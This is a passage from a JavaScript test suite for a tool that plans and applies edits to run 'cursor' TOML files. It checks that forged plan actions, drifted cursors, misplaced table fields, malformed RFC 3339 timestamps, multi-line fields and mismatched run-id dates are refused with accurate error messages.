  assert.match(await readFile(cursorPath, 'utf8'), /status = "closed"/);
});

// --- M2: every conjunct of the reconstruction equality set discriminates ---
// Deleting any one of them left the whole suite green, so each is pinned by a
// case that ONLY that conjunct refuses. The most dangerous forgery — same
// id/path/type, attacker-chosen content written into the cursor — is the
// `content` row.

test('P1-A — each reconstruction conjunct discriminates: id, path, type, content', async (t) => {
  const foreign = '.grove/runs/20260728-990000-other/cursor.toml';
  const cases = {
    id: (licensed) => ({ ...licensed, id: 'write:decoy.toml' }),
    path: (licensed) => ({ ...licensed, path: foreign }),
    type: (licensed) => ({ ...licensed, type: 'delete' }),
    content: (licensed) => ({ ...licensed, content: 'schema = 1\nstatus = "closed"\nowned = true\n' }),
  };
  for (const [conjunct, forge] of Object.entries(cases)) {
    await t.test(conjunct, async () => {
      const dir = await repoFixture();
      const cursorPath = await openedRun(dir);
      const before = await readFile(cursorPath, 'utf8');
      const plan = await cleanClosablePlan(dir);
      plan.actions = [forge(plan.actions[0])];
      await assert.rejects(
        applyRunPlan(plan, {}),
        (error) => /does not reconstruct/i.test(error.message),
        `the ${conjunct} conjunct must refuse this plan`,
      );
      assert.equal(await readFile(cursorPath, 'utf8'), before, 'the cursor is untouched');
      await assert.rejects(readFile(join(dir, foreign)), /ENOENT/);
    });
  }
});

test('P1-A — a licensed action carrying no planned file precondition is refused (L2)', async () => {
  const dir = await repoFixture();
  const cursorPath = await openedRun(dir);
  const before = await readFile(cursorPath, 'utf8');
  const plan = await cleanClosablePlan(dir);
  delete plan.actions[0].expected;
  await assert.rejects(
    applyRunPlan(plan, {}),
    (error) => /no file precondition/i.test(error.message),
  );
  assert.equal(await readFile(cursorPath, 'utf8'), before);
});

test('L3 — a cursor edited between plan and apply is reported as drift, never as forgery', async () => {
  const dir = await repoFixture();
  const cursorPath = await openedRun(dir);
  const plan = await cleanClosablePlan(dir);
  // A benign concurrent edit: still well-formed, still open, different bytes.
  await writeFile(cursorPath, `${await readFile(cursorPath, 'utf8')}# noted by a human\n`);
  await assert.rejects(
    applyRunPlan(plan, {}),
    (error) => /changed after planning/i.test(error.message)
      && !/guardLicensed is a hint/i.test(error.message),
  );
  assert.match(await readFile(cursorPath, 'utf8'), /status = "open"/, 'nothing was applied');
});

// --- R4: the field edit is scoped to the ROOT table (INV8/AC5) ---
// Found by review against 4106b4c. `claims` is a DECLARED cursor key whose
// presence is a defect on a PARSEABLE cursor, never a parse failure — so a
// cursor carrying a `[[claims]]` array-of-tables is well-formed, and the
// well-formed branch of abort/close is the one that runs. The edit appended
// `closed`/`reason` at end-of-file with no table-scope awareness, so they
// landed inside that table instead of at the root: the first abort wrote a
// schema-INVALID aborted cursor ("aborted cursor requires a closed
// timestamp"). Close had the identical gap, blocked only incidentally (the
// guard reports `claims` as a defect and denies the exit-0 license at apply).
// The fix keeps INV8 literal — still a field edit, never the whole-file
// exception, which stays pinned to the unparseable-or-schema-invalid row.

function claimsTableCursor(runId, { statusInsideTable = false } = {}) {
  return `schema = 1\nrun = "${runId}"\nopened = "${openedFor(runId)}"\n`
    + 'intent = "land the fixture"\nsubjects = ["specs/changed.md"]\nstatus = "open"\n'
    + '\n[[claims]]\nnote = "written by no shipped path"\n'
    + (statusInsideTable ? 'status = "open"\n' : '');
}

async function claimsCursorFixture(runId, options) {
  const dir = await repoFixture();
  await mkdir(join(dir, '.grove', 'runs', runId), { recursive: true });
  const path = join(dir, '.grove', 'runs', runId, 'cursor.toml');
  await writeFile(path, claimsTableCursor(runId, options));
  // The premise: this cursor is WELL-FORMED, so the whole-file exception is
  // out of reach and the field edit must produce a valid cursor by itself.
  assert.equal(parseCursor(await readFile(path, 'utf8'), { runId }).ok, true);
  return { dir, path };
}

test('R4 — abort edits the ROOT table: a trailing [[claims]] table cannot swallow closed/reason', async () => {
  const runId = '20260728-140000-claims';
  const { dir, path } = await claimsCursorFixture(runId);

  const plan = await planAbortRun({
    repoRoot: dir, runId, closed: '2026-07-28T19:00:00Z', reason: 'abort the claims-carrying run',
  });
  assert.equal(plan.ok, true, plan.summary);
  assert.equal(plan.wholeFileReplacement, false, 'INV8: still a field edit, never the exception');
  const planned = parseCursor(plan.actions[0].content, { runId });
  assert.equal(planned.ok, true, `planned bytes must validate: ${planned.reason}`);

  await applyRunPlan(plan, { confirmedActionIds: plan.actions.map((a) => a.id) });
  const text = await readFile(path, 'utf8');
  const parsed = parseCursor(text, { runId });
  assert.equal(parsed.ok, true, `the written cursor must validate: ${parsed.reason}`);
  assert.equal(parsed.cursor.status, 'aborted');
  assert.equal(parsed.cursor.closed, '2026-07-28T19:00:00Z');
  assert.equal(parsed.cursor.reason, 'abort the claims-carrying run');
  // At the ROOT, not inside the table.
  assert.equal(parsed.cursor.claims[0].closed, undefined);
  assert.equal(parsed.cursor.claims[0].reason, undefined);
  // INV8's immutability half: every open-time byte survives, table included.
  assert.match(text, /intent = "land the fixture"/);
  assert.match(text, /subjects = \["specs\/changed\.md"\]/);
  assert.match(text, /\[\[claims\]\]/);
  assert.match(text, /note = "written by no shipped path"/);
});

test('R4 — close plans ROOT-table bytes on the same cursor; the planned edit must validate pre-write', async () => {
  const runId = '20260728-150000-claims';
  const { dir } = await claimsCursorFixture(runId);

  const plan = await planCloseRun({ repoRoot: dir, runId, closed: '2026-07-28T20:00:00Z' });
  assert.equal(plan.ok, true, plan.summary);
  const planned = parseCursor(plan.actions[0].content, { runId });
  assert.equal(planned.ok, true, `planned bytes must validate: ${planned.reason}`);
  assert.equal(planned.cursor.status, 'closed');
  assert.equal(planned.cursor.closed, '2026-07-28T20:00:00Z');
  assert.equal(planned.cursor.claims[0].closed, undefined);
});

test('R4 — the status line is counted in the root table only: a [[claims]] status never wedges abort', async () => {
  const runId = '20260728-160000-claims';
  const { dir, path } = await claimsCursorFixture(runId, { statusInsideTable: true });

  const plan = await planAbortRun({
    repoRoot: dir, runId, closed: '2026-07-28T19:00:00Z', reason: 'abort despite the second status line',
  });
  assert.equal(plan.ok, true, `a file-wide status count wedged this run: ${plan.summary}`);
  assert.equal(plan.wholeFileReplacement, false);
  await applyRunPlan(plan, { confirmedActionIds: plan.actions.map((a) => a.id) });
  const text = await readFile(path, 'utf8');
  const parsed = parseCursor(text, { runId });
  assert.equal(parsed.ok, true, `the written cursor must validate: ${parsed.reason}`);
  assert.equal(parsed.cursor.status, 'aborted');
  // Only the ROOT status line was rewritten; the table's own key is untouched.
  assert.equal(parsed.cursor.claims[0].status, 'open');
});

// --- R4: the cursor's declared field contracts, enforced (write side) ---
// Found by review against 4106b4c. §Run cursor contract declares `opened` and
// `closed` RFC 3339 UTC and `intent`/`reason` one line — and every site
// checked only "a non-empty string", so `opened = "not-a-time"` planned,
// committed, and read back clean, and a newline in `intent` survived
// serialization intact (JSON.stringify escapes it, the TOML parser decodes it
// again). The tables below quantify over the mechanism: every planner that
// takes a timestamp, and every field declared one line. The contracts
// themselves live once, in cursor.mjs, and the read side enforces the same
// ones (see the parseCursor test in guard-core.test.mjs).

// Why these tests assert the REFUSAL TEXT and not just `ok === false`:
// measured, every planner already re-parses its planned bytes through
// parseCursor (open's round-trip gate, close/abort's post-edit gate), so with
// parseCursor enforcing the contracts a planner would refuse these inputs even
// with no check of its own — mutating the planner check out left the whole
// suite green. What the planner check actually buys is an ACCURATE refusal:
// "opened … is not an RFC 3339 UTC instant" rather than "planned cursor does
// not round-trip (…)", which sends the reader hunting for a serialization
// fault that is not there. That is the property under test, so that is what is
// asserted.
const CONTRACT_REFUSAL = /is not an RFC 3339 UTC instant|names no such calendar date|names no real instant/;

const BAD_TIMESTAMPS = [
  ['prose', 'not-a-time'],
  ['a non-RFC-3339 order', '28/07/2026'],
  ['grammatical but impossible', '2026-13-45T99:99:99Z'],
  ['a real-looking day that does not exist', '2026-02-30T00:00:00Z'],
  ['Feb 29 in a non-leap year', '2026-02-29T00:00:00Z'],
  ['whitespace only', '   '],
  ['a local-time spelling with no zone', '2026-07-28T14:00:00'],
  ['an offset instead of UTC', '2026-07-28T14:00:00+01:00'],
  ['a date with no time', '2026-07-28'],
];

test('R4 — every planner enforces the RFC 3339 UTC timestamp contract, not just non-emptiness', async (t) => {
  for (const [name, stamp] of BAD_TIMESTAMPS) {
    await t.test(`open-run rejects opened: ${name}`, async () => {
      const dir = await repoFixture();
      const plan = await planOpenRun(openRequest(dir, { opened: stamp }));
      assert.equal(plan.ok, false, `${name} (${JSON.stringify(stamp)}) must not plan`);
      assert.deepEqual(plan.actions, []);
      assert.match(plan.summary, /opened/, plan.summary);
      assert.match(plan.summary, CONTRACT_REFUSAL, plan.summary);
      assert.doesNotMatch(plan.summary, /round-trip/, `the contract check names the contract: ${plan.summary}`);
    });
    await t.test(`close-run rejects closed: ${name}`, async () => {
      const dir = await repoFixture();
      await openedRun(dir);
      const plan = await planCloseRun({ repoRoot: dir, runId: RUN_ID, closed: stamp });
      assert.equal(plan.ok, false, `${name} (${JSON.stringify(stamp)}) must not plan`);
      assert.deepEqual(plan.actions, []);
      assert.match(plan.summary, /closed/, plan.summary);
      assert.match(plan.summary, CONTRACT_REFUSAL, plan.summary);
      assert.doesNotMatch(plan.summary, /round-trip/, `the contract check names the contract: ${plan.summary}`);
    });
    await t.test(`abort-run rejects closed: ${name}`, async () => {
      const dir = await repoFixture();
      await openedRun(dir);
      const plan = await planAbortRun({
        repoRoot: dir, runId: RUN_ID, closed: stamp, reason: 'dead run',
      });
      assert.equal(plan.ok, false, `${name} (${JSON.stringify(stamp)}) must not plan`);
      assert.deepEqual(plan.actions, []);
      assert.match(plan.summary, /closed/, plan.summary);
      assert.match(plan.summary, CONTRACT_REFUSAL, plan.summary);
      assert.doesNotMatch(plan.summary, /round-trip/, `the contract check names the contract: ${plan.summary}`);
    });
  }
  // The contract admits what it should: the canonical spelling and fractional
  // seconds both plan.
  const dir = await repoFixture();
  const good = await planOpenRun(openRequest(dir, {
    opened: `${openedFor(RUN_ID).slice(0, -1)}.250Z`,
  }));
  assert.equal(good.ok, true, good.summary);
});

test('R4 — the one-line contract covers intent and reason, a lone CR as well as an LF', async (t) => {
  for (const [name, breaker] of [['LF', '\n'], ['CR', '\r'], ['CRLF', '\r\n']]) {
    await t.test(`open-run rejects a multi-line intent (${name})`, async () => {
      const dir = await repoFixture();
      const plan = await planOpenRun(openRequest(dir, { intent: `line one${breaker}line two` }));
      assert.equal(plan.ok, false, `${name} in intent must not plan`);
      assert.deepEqual(plan.actions, []);
      assert.match(plan.summary, /intent/, plan.summary);
      assert.match(plan.summary, /must be one line/, plan.summary);
      assert.doesNotMatch(plan.summary, /round-trip/, plan.summary);
    });
    await t.test(`abort-run rejects a multi-line reason (${name})`, async () => {
      const dir = await repoFixture();
      await openedRun(dir);
      const plan = await planAbortRun({
        repoRoot: dir,
        runId: RUN_ID,
        closed: '2026-07-28T19:00:00Z',
        reason: `dead${breaker}run`,
      });
      assert.equal(plan.ok, false, `${name} in reason must not plan`);
      assert.deepEqual(plan.actions, []);
      assert.match(plan.summary, /reason/, plan.summary);
      // The LF-only predecessor let a lone CR reach the round-trip probe,
      // which refused it as a serialization fault instead of a contract one.
      assert.match(plan.summary, /must be one line/, plan.summary);
      assert.doesNotMatch(plan.summary, /round-trip/, plan.summary);
    });
  }
});

test("R4 — a caller's malformed timestamp is named before repository state can mask it", async () => {
  // What the close/abort timestamp checks buy that the shared post-edit gate
  // does not: ORDER. Validate the caller's own arguments before inspecting the
  // repository, or a bad argument arriving at a missing (or malformed) run is
  // reported as a missing run and the caller never learns their input was
  // wrong. Measured: without the pre-state check these refuse with "no cursor
  // exists for run …" instead.
  const dir = await repoFixture();
  const close = await planCloseRun({ repoRoot: dir, runId: RUN_ID, closed: 'whenever' });
  assert.equal(close.ok, false);
  assert.match(close.summary, CONTRACT_REFUSAL, close.summary);
  assert.doesNotMatch(close.summary, /no cursor exists/, close.summary);

  const abort = await planAbortRun({
    repoRoot: dir, runId: RUN_ID, closed: 'whenever', reason: 'dead run',
  });
  assert.equal(abort.ok, false);
  assert.match(abort.summary, CONTRACT_REFUSAL, abort.summary);
  assert.doesNotMatch(abort.summary, /no cursor exists/, abort.summary);
});

// --- R6: the second call site of the root-bounded status probe ---
// listOpenCursors reads the same probe, so the same smuggled status let
// open-run admit a SECOND cursor beside a malformed one — the stale-cursor
// guarantee (INV7: at most one open cursor) turned off by a value in a table.

test('R6 — open-run refuses beside a cursor whose ROOT status is missing but a table carries one', async () => {
  for (const smuggled of ['closed', 'aborted']) {
    const dir = await repoFixture();
    const stale = `20260728-140000-${smuggled}`;
    await mkdir(join(dir, '.grove', 'runs', stale), { recursive: true });
    await writeFile(
      join(dir, '.grove', 'runs', stale, 'cursor.toml'),
      `schema = 1\nrun = "${stale}"\nopened = "${openedFor(stale)}"\n`
        + 'intent = "root status is missing"\nsubjects = ["specs/changed.md"]\n'
        + `\n[[claims]]\nstatus = "${smuggled}"\n`,
    );

    const plan = await planOpenRun(openRequest(dir, {
      runId: '20260728-160000-second', opened: openedFor('20260728-160000-second'),
    }));
    assert.equal(
      plan.ok, false,
      `${smuggled}: a malformed cursor is open for mode selection, so open-run must refuse`,
    );
    assert.deepEqual(plan.actions, []);
    assert.match(plan.summary, new RegExp(stale), plan.summary);
    assert.match(plan.summary, /adopt|abort/i, plan.summary);
  }
});


// --- R9: the run-id instant and `opened` are one fact, checked as one ---
// §Run cursor contract: the run id is the "UTC `YYYYMMDD-HHMMSS` open moment
// plus a slug", and `opened` is its "deliberate duplicate of the run-id
// instant". Validated in isolation each field passed while the pair disagreed,
// so a cursor could claim two different open moments — and an impossible date
// carried only in the run id was never checked at all, because nothing parsed
// that prefix as a date.

test('R9 — the run-id prefix must equal opened, in cursor validation and in planning', async () => {
  const mismatched = (runId, opened) =>
    `schema = 1\nrun = "${runId}"\nopened = "${opened}"\n`
    + 'intent = "fixture"\nsubjects = ["specs/a.md"]\nstatus = "open"\n';

  const bad = parseCursor(mismatched('20260728-140322-r', '1999-01-01T00:00:00Z'), {
    runId: '20260728-140322-r',
  });
  assert.equal(bad.ok, false, 'a disagreeing pair is not a valid cursor');
  assert.match(bad.reason, /open moment/, bad.reason);

  // Agreement passes, fractional seconds included.
  for (const opened of ['2026-07-28T14:03:22Z', '2026-07-28T14:03:22.250Z']) {
    assert.equal(
      parseCursor(mismatched('20260728-140322-r', opened), { runId: '20260728-140322-r' }).ok,
      true, `${opened} agrees with the run id`,
    );
  }

  // An impossible date carried ONLY in the run id: the prefix must equal an
  // `opened` that has already passed the calendar spell-back, so this cannot
  // pass whatever `opened` says.
  assert.equal(
    parseCursor(mismatched('20260230-140322-r', '2026-02-28T14:03:22Z'), {
      runId: '20260230-140322-r',
    }).ok,
    false, 'February 30th cannot be smuggled in through the run id',
  );

  // The planner refuses the same pair pre-write.
  const dir = await repoFixture();
  const plan = await planOpenRun(openRequest(dir, {
    runId: '20260728-150000-second', opened: '2026-07-28T14:00:00Z',
  }));
  assert.equal(plan.ok, false);
  assert.deepEqual(plan.actions, []);
  assert.match(plan.summary, /open moment/, plan.summary);
  // The planner's own check is behaviourally redundant with its round-trip
  // gate — parseCursor would refuse these bytes anyway — so what it buys is an
  // ACCURATE refusal naming the disagreement, rather than "planned cursor does
  // not round-trip (...)", which sends the reader hunting for a serialization
  // fault that is not there. Measured: that is the only difference, so that is
  // what is asserted.
  assert.doesNotMatch(plan.summary, /round-trip/, plan.summary);

  // And the agreeing request this fixture normally builds still plans.
  const good = await planOpenRun(openRequest(dir));
  assert.equal(good.ok, true, good.summary);
});
